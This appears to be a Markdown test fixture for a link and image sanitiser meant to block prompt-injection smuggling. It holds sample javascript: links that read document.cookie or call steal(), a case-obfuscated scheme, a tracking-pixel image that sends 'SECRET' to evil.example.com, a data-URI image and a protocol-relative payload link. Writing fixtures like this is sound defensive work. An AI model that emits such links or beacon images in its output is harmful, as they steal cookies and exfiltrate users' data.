# Untrusted content

This document is deliberately hostile — every link and image here is the kind of
thing a prompt injection would try to smuggle through.

A [click here][x] link that hides a script URL, and an inline
[run it](javascript:alert(document.cookie)) that spells the scheme out in the
open. A scheme with sneaky casing: [nope](JaVaScRiPt:void(0)).

An exfiltration image that beacons to an attacker host:
![tracking pixel](https://evil.example.com/pixel.png?c=SECRET)

A data-URI image trying to inline a payload:
![inline](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)

A protocol-relative link that resolves to an absolute host regardless of the
page scheme: [mirror](//cdn.evil.example.com/payload).

A relative link that is perfectly fine and must stay allowed: [see the docs](./guide.md).
Every *image* in this document, by contrast, points at an external or `data:`
source, so under the default policy every one of them is blocked.

[x]: javascript:steal()
